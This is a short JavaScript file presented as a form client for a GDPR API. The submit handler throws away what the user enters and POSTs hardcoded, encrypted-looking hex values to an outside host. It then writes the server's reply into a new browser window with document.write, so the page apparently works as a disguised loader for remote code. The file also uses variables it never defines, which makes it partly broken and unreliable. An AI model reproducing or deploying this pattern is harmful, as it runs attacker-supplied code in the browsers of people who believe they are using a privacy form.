const apiClass = 'apiKey';
const inputApi = document.getElementById(apiClass);
const accept = '/accept';
const urlProd = 'https://api.netcentric.biz/gdpr';
const urlBase = urlProd;

/**
 * Open the results in a new tab/window
 * @param {string} data The answered data from the API
 * @param {string} url destination url
 */
function openInNewWindow(data, url = 'about:blank') {
  const newWindow = window.open(url, '_blank');
  newWindow.document.write(data);
  newWindow.focus();
}

/**
 * Send a query to the GDPR API and save the apiKey to localStorage for further calls
 * @param {{data:string, init:string, confirm:string}} result form fields
 */
async function fetchForm(result) {
  const { data, init, confirm } = result;
  const url = urlBase + accept;
  const options = {
    method: 'POST',
    headers: { "Content-type": "application/json; charset=UTF-8" },
    body: JSON.stringify({
      data: "e9341595fb243eca8f1c222f6452573e0c4739be3153b8b0b4158b885b452fc2",
      init: "80b1be5e317f050355295684f64e739b",
      confirm: "true"
  })
  };
  try {
    const response = await fetch(url, options);
    const data = await response.text();
    if (data.includes('http')) {
      if (!savedApiKey || savedApiKey !== apiKey) localStorage.setItem(apiClass, apiKey);
      openInNewWindow(data, url);
    } else {
      const { message } = JSON.parse(data);
      throw message;
    }
  } catch (error) {
    // Show a message below the form, in the feedback section
    feedback.classList.add('show');
    showFeedbackMessage(error);

    // eslint-disable-next-line no-console
    console.error(
      `%cError sending the data: %c${error}`,
      'color:#f88; background-color:#290002',
      'color:white; background-color:#290002',
    );
  }
}

form.onsubmit = async (e) => {
  e.preventDefault();
  const results = {};
  const inputFields = inputs.length;
  [...e.target].forEach((el) => {
    const { id } = el;
    if (id !== '' && el.value.trim() !== '') {
      results[id] = el.value;
    }
  });

  const { length } = Object.entries(results);
  // fetch the data
  if (length === inputFields) await fetchForm(results);
};

form.onkeyup = (e) => checkErrorMessage(e);

inputs.forEach((input) => {
  input.onblur = (e) => checkErrorMessage(e);
});
